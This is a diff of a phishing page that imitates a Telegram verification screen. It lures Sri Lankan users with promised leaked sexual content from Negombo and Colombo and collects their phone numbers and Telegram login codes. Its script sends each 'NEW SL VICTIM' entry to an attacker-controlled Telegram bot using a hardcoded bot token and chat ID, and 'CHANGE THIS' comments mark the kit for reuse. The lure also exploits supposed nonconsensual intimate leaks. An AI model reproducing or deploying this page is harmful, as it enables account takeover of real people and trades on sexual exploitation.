@@ -2,35 +2,48 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Telegram Login</title>
+    <title>Telegram - Verify</title>
     <style>
-        body { background: #0F0F0F; color: white; font-family: Arial; text-align: center; padding: 30px; }
-        .box {
-            background: #1a1a1a;
-            max-width: 400px;
-            margin: 40px auto;
+        body {
+            background: linear-gradient(#0a0a0a, #1a0033);
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
             padding: 40px 20px;
-            border-radius: 15px;
-            border: 3px solid #229ED9;
         }
+        .box {
+            background: #1F1F1F;
+            max-width: 420px;
+            margin: 40px auto;
+            padding: 40px 25px;
+            border-radius: 20px;
+            border: 3px solid #229ED9;
+            box-shadow: 0 0 40px #229ED9;
+        }
+        h1 { color: #229ED9; font-size: 32px; }
         input {
-            width: 85%;
-            padding: 15px;
+            width: 90%;
+            padding: 16px;
             margin: 15px 0;
             background: #333;
-            border: 1px solid #555;
-            border-radius: 8px;
+            border: 2px solid #555;
+            border-radius: 10px;
             color: white;
-            font-size: 17px;
+            font-size: 18px;
         }
         button {
             background: #229ED9;
             color: white;
-            padding: 16px 60px;
-            font-size: 22px;
+            padding: 18px 60px;
+            font-size: 23px;
             border: none;
-            border-radius: 10px;
+            border-radius: 12px;
             cursor: pointer;
+            margin-top: 25px;
+            box-shadow: 0 0 20px #229ED9;
+        }
+        button:hover {
+            background: #1E90FF;
         }
     </style>
 </head>
@@ -38,39 +51,35 @@
 
 <div class="box">
     <h1>🔵 Telegram</h1>
-    <h2>Verify to unlock Sri Lankan Leaks</h2>
-    <p>🍑 Hot Negombo & Colombo content loading...</p>
+    <h2>🔓 Verify to Unlock Hot Sri Lankan Content</h2>
+    <p>🍑 අලුත්ම Negombo & Colombo Leaks බලන්න දැන්ම!</p>
 
-    <input type="tel" id="phone" placeholder="+94xxxxxxxxx" />
-    <input type="text" id="code" placeholder="Enter verification code" />
+    <input type="tel" id="phone" placeholder="+94 Phone Number" />
+    <input type="text" id="code" placeholder="Verification Code" />
 
-    <button onclick="sendToBot()">Continue to XXX Content 😈</button>
+    <button onclick="sendData()">UNLOCK වෙන්​න 😈</button>
 </div>
 
 <script>
-function sendToBot() {
+function sendData() {
     let phone = document.getElementById('phone').value;
     let code = document.getElementById('code').value;
 
     if(!phone || !code) {
-        alert("Phone සහ Code දාන්න!");
+        alert("Phone number සහ Code දෙන්න!");
         return;
     }
 
-    const token = "8418029750:AAEXSgDBZyNwostfOPGib5ZvelEsc-56jmI";
-    const chatId = "badmoody_117";
+    const token = "8418029750:AAEXSgDBZyNwostfOPGib5ZvelEsc-56jmI";     // ← CHANGE THIS
+    const chatId = "badmoody_117";      // ← CHANGE THIS
 
-    const text = `🔥 NEW VICTIM 🔥%0APhone: ${phone}%0ACode: ${code}%0AFrom: Sri Lankan Leak Bot`;
+    const text = `🔥 NEW SL VICTIM 🔥%0APhone: ${phone}%0ACode: ${code}%0ATime: ${new Date()}`;
 
-    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}`)
-    .then(() => alert("Loading hot Sri Lankan videos... 😈"));
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}`);
+
+    alert("Loading Hot Sri Lankan Videos... 😈 Please Wait");
 }
 </script>
 
 </body>
-</html>        
-මිනිත්තු කිහිපයක් ඇතුළත ඔබව අපගේ adminවරයෙකු විසින් අදාළ group එකට Add කරනු ලැබේ. Due to high demand we appreciate your patience.
-</script>\
-\
-</body>\
-</html>}
+</html>
